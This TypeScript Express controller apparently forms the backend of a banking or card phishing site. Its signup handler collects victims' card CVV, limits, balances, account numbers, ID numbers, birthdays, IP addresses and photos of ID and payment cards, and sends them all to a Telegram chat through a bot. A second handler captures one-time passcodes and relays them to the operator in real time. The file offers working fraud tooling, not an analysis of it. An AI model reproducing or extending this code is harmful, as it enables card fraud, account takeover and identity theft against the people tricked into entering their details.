import { Request, Response } from "express";
import { Account } from "../models/account.model";
const TelegramBot = require("node-telegram-bot-api");
import dotenv from "dotenv";
dotenv.config();

const TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const bot = new TelegramBot(TOKEN, { polling: false });

export class AccountController {
  async signup(req: Request, res: Response) {
    try {
      console.log("req.headers[x-forwarded-for]", req.headers["x-forwarded-for"]);
      console.log("req.socket.remoteAddress", req.socket.remoteAddress);
      console.log("req.connection.remoteAddress", req.connection.remoteAddress);
      const ip =
        req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
      const {
        email,
        name,
        phone,
        idCard,
        birthday,
        cvv,
        cardLimit,
        cardBalance,
        proposeLimit,
        cardType,
        accountNumber,
        socketId,
      } = req.body;

      let frontIdCard = "";
      let backIdCard = "";
      let frontCard = "";
      let backCard = "";

      if (req.files) {
        const files = req.files as {
          [fieldname: string]: Express.Multer.File[];
        };

        // if (!files.frontIdCard || !files.backIdCard) {
        //   return res.status(400).json({
        //     message: "Front and back of ID card are required",
        //   });
        // }

        // if (!files.frontCard || !files.backCard) {
        //   return res.status(400).json({
        //     message: "Front and back of card are required",
        //   });
        // }

        frontIdCard = files?.frontIdCard ? files.frontIdCard[0].path : "";

        backIdCard = files?.backIdCard ? files.backIdCard[0].path : "";
        frontCard = files?.frontCard ? files.frontCard[0].path : "";
        backCard = files?.backCard ? files.backCard[0].path : "";
      }

      const account = new Account({
        email,
        name,
        phone,
        frontIdCard,
        backIdCard,
        idCard,
        birthday,
        cvv,
        frontCard,
        backCard,
        cardLimit,
        cardBalance,
        proposeLimit,
        cardType,
        socketId,
        accountNumber,
        ip,
      });

      await account.save();
      bot.sendMessage(
        process.env.TELEGRAM_CHAT_ID,
        `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
      );
      // send message and photo
      frontIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontIdCard);
      backIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backIdCard);
      frontCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontCard);
      backCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backCard);

      return res.status(200).json({
        message: "Signup successfully",
      });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  }

  async getAll(req: Request, res: Response) {
    try {
      const accounts = await Account.find().sort({ createdAt: -1 });

      return res.status(200).json({
        accounts,
      });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  }

  async delete(req: Request, res: Response) {
    try {
      const { id } = req.params;

      await Account.findByIdAndDelete(id);

      return res.status(200).json({
        message: "Delete successfully",
      });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  }

  async updateOTP(req: Request, res: Response) {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      const result = await Account.findByIdAndUpdate(
        id,
        { otp },
        { new: true }
      );
      io.emit("updateOTP", result);

      bot.sendMessage(
        process.env.TELEGRAM_CHAT_ID,
        `OTP: ${otp}\nName: ${result?.name}`
      );
      return res.status(200).json({ result });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  }
}
